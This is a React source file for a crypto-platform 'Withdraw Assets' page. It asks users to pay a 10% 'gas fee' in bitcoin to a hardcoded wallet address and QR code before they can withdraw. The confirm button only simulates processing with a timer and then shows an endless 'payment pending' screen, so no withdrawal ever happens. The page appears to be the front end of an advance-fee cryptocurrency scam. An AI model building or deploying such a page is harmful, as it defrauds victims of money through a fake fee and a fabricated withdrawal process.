import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAuth } from '../lib/AuthContext';
import { ArrowLeft, Copy, Check, AlertTriangle, Loader } from 'lucide-react';
export function WithdrawPage() {
  const { user, loading } = useAuth();
  const navigate = useNavigate();
  const [copied, setCopied] = useState(false);
  const [confirming, setConfirming] = useState(false);
  const [paymentPending, setPaymentPending] = useState(false);
  const BTC_ADDRESS = 'bc1qedjgpmpa69922x2pzqgyfp0nxf20wxvwzl2qvk';
  useEffect(() => {
    if (!loading && !user) {
      navigate('/login');
    }
  }, [user, loading, navigate]);
  if (loading || !user) {
    return (
      <div className="min-h-screen pt-20 flex items-center justify-center">
        <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-neon-cyan"></div>
      </div>);

  }
  const totalAssets = user.total_assets || 0;
  const gasFee = totalAssets * 0.1;
  const receiveAmount = totalAssets - gasFee;
  const handleCopy = () => {
    navigator.clipboard.writeText(BTC_ADDRESS);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };
  const handleConfirm = () => {
    setConfirming(true);
    // Simulate processing
    setTimeout(() => {
      setConfirming(false);
      setPaymentPending(true);
    }, 2000);
  };
  if (paymentPending) {
    return (
      <div className="min-h-screen pt-20 pb-16 px-4 flex items-center justify-center">
        <div className="max-w-lg w-full text-center">
          <div className="glass-panel p-10 rounded-3xl border border-neon-cyan/30">
            <div className="w-20 h-20 bg-neon-cyan/20 rounded-full flex items-center justify-center mx-auto mb-6">
              <Loader className="w-10 h-10 text-neon-cyan animate-spin" />
            </div>
            <h2 className="text-3xl font-bold text-white mb-4">
              Payment Confirmation Pending
            </h2>
            <p className="text-gray-300 mb-8">
              We are verifying your gas fee payment on the blockchain. This
              usually takes 10-30 minutes depending on network congestion.
            </p>
            <div className="bg-white/5 p-4 rounded-xl mb-8 text-left">
              <p className="text-sm text-gray-400 mb-2">Transaction ID</p>
              <p className="font-mono text-neon-cyan text-sm break-all">
                Pending...
              </p>
            </div>
            <button
              onClick={() => navigate('/dashboard')}
              className="px-8 py-3 rounded-xl bg-white/10 hover:bg-white/20 text-white font-bold transition-colors">

              Return to Dashboard
            </button>
          </div>
        </div>
      </div>);

  }
  return (
    <div className="min-h-screen pt-24 pb-16 px-4">
      <div className="max-w-3xl mx-auto">
        <button
          onClick={() => navigate('/dashboard')}
          className="flex items-center text-gray-400 hover:text-white mb-8 transition-colors">

          <ArrowLeft className="w-5 h-5 mr-2" /> Back to Dashboard
        </button>

        <h1 className="text-4xl font-bold font-display mb-8">
          Withdraw Assets
        </h1>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
          {/* Breakdown */}
          <div className="glass-panel p-8 rounded-3xl h-fit">
            <h3 className="text-xl font-bold text-white mb-6">
              Withdrawal Breakdown
            </h3>

            <div className="space-y-4 mb-8">
              <div className="flex justify-between items-center">
                <span className="text-gray-400">Total Assets</span>
                <span className="text-white font-bold">
                  ${totalAssets.toLocaleString()}
                </span>
              </div>
              <div className="flex justify-between items-center">
                <span className="text-gray-400">Gas Fee (10%)</span>
                <span className="text-neon-pink font-bold">
                  -${gasFee.toLocaleString()}
                </span>
              </div>
              <div className="h-px bg-white/10 my-4"></div>
              <div className="flex justify-between items-center">
                <span className="text-white font-bold">You Receive</span>
                <span className="text-neon-green font-bold text-xl">
                  ${receiveAmount.toLocaleString()}
                </span>
              </div>
            </div>

            <div className="bg-neon-pink/10 border border-neon-pink/30 p-4 rounded-xl flex items-start">
              <AlertTriangle className="w-5 h-5 text-neon-pink mr-3 flex-shrink-0 mt-0.5" />
              <p className="text-sm text-neon-pink/90">
                A 10% gas fee is required to process this withdrawal on the
                blockchain. Please pay this fee to the address provided to
                proceed.
              </p>
            </div>
          </div>

          {/* Payment */}
          <div className="glass-panel p-8 rounded-3xl border border-neon-cyan/30">
            <h3 className="text-xl font-bold text-white mb-6">
              Pay Gas Fee via BTC
            </h3>

            <div className="flex justify-center mb-6">
              <div className="bg-white p-4 rounded-xl">
                <img
                  src="/BTC_QRCODE.jpg"
                  alt="BTC QR Code"
                  className="w-48 h-48 object-contain" />

              </div>
            </div>

            <div className="mb-8">
              <label className="block text-sm text-gray-400 mb-2">
                BTC Address
              </label>
              <div className="flex items-center bg-black/40 border border-white/10 rounded-xl overflow-hidden">
                <input
                  type="text"
                  readOnly
                  value={BTC_ADDRESS}
                  className="w-full bg-transparent px-4 py-3 text-sm text-white font-mono focus:outline-none" />

                <button
                  onClick={handleCopy}
                  className="p-3 hover:bg-white/10 text-gray-400 hover:text-white transition-colors border-l border-white/10"
                  title="Copy Address">

                  {copied ?
                  <Check className="w-5 h-5 text-neon-green" /> :

                  <Copy className="w-5 h-5" />
                  }
                </button>
              </div>
            </div>

            <button
              onClick={handleConfirm}
              disabled={confirming}
              className="w-full py-4 rounded-xl bg-gradient-to-r from-neon-cyan to-neon-blue text-black font-bold text-lg hover:shadow-[0_0_20px_rgba(0,240,255,0.4)] transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed">

              {confirming ? 'Processing...' : 'Confirm Withdrawal'}
            </button>
          </div>
        </div>
      </div>
    </div>);

}